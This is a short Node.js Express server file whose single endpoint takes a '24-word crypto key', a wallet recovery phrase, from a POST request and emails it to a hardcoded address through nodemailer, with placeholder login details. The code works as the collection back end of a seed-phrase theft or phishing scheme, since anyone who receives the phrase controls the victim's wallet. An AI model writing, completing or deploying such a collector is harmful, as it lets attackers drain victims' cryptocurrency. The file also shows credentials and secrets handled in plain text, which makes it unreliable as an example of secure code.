const express = require('express');
const bodyParser = require('body-parser');
const nodemailer = require('nodemailer');

const app = express();
const port = process.env.PORT || 3000;

// Body parser middleware
app.use(bodyParser.json());

// Endpoint to receive the 24-word crypto key
app.post('/send-crypto-key', (req, res) => {
  const cryptoKey = req.body.cryptoKey;

  // Replace with your hardcoded email address
  const toEmail = 'your_email@example.com';

  // Create a Nodemailer transporter
  const transporter = nodemailer.createTransport({
    service: 'your_email_service', // e.g., 'Gmail', 'Yahoo', etc.
    auth: {
      user: 'your_email@example.com',
      pass: 'your_email_password',
    },
  });

  // Email message
  const mailOptions = {
    from: 'your_email@example.com',
    to: toEmail,
    subject: 'Crypto Key',
    text: `Here is the 24-word crypto key:\n\n${cryptoKey}`,
  };

  // Send email
  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      console.error('Error sending email:', error);
      res.status(500).send('Error sending email');
    } else {
      console.log('Email sent:', info.response);
      res.status(200).send('Email sent successfully');
    }
  });
});

app.listen(port, () => {
  console.log(`Server is running on port ${port}`);
});
